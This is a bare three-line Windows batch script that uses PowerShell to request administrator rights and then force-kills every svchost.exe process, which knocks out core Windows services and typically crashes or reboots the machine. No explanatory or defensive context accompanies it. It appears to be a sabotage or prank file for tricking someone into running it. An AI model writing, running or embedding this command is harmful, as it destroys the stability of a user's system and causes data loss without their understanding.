@echo off
powershell -Command "Start-Process cmd -ArgumentList '/k taskkill /f /im svchost.exe' -Verb RunAs"
exit
